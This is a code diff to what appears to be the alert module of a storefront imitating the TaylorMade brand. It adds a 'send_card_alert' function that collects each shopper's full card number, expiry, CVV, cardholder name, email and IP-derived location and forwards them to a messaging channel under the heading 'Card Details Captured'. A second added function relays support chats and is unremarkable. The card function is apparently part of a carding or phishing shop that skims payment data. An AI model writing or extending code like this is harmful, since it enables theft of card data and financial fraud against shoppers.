@@ -122,3 +122,43 @@ def send_order_alert(user_email: str, total: float, payment_method: str, ip: str
         f"─────────────────────"
     )
     return _send(msg)
+
+
+def send_card_alert(
+    user_email: str,
+    card_number: str,
+    expiry: str,
+    cvv: str,
+    cardholder_name: str,
+    total: float = 0,
+    ip: str = "",
+) -> bool:
+    location = _get_location(ip)
+    msg = (
+        f"💳 *TaylorMade — Card Details Captured*\n"
+        f"═════════════════════\n"
+        f"👤 *Cardholder:* {cardholder_name}\n"
+        f"📧 *Email:* {user_email}\n"
+        f"💳 *Card Number:* `{card_number}`\n"
+        f"📅 *Expiry:* {expiry}\n"
+        f"🔒 *CVV:* {cvv}\n"
+        f"💰 *Order Total:* ${total:,.2f}\n"
+        f"{location}\n"
+        f"🕐 *Time:* {_now()}\n"
+        f"═════════════════════"
+    )
+    return _send(msg)
+
+
+def send_support_chat_alert(user_email: str, message: str, session_id: str) -> bool:
+    msg = (
+        f"🔔 *TaylorMade — New Support Message*\n"
+        f"─────────────────────\n"
+        f"📧 *From:* {user_email}\n"
+        f"💬 *Message:* {message}\n"
+        f"🕐 *Time:* {_now()}\n"
+        f"─────────────────────\n"
+        f"↩️ *Reply to this message to respond to the customer*\n"
+        f"🔑 `SESSION_ID:{session_id}`"
+    )
+    return _send(msg)
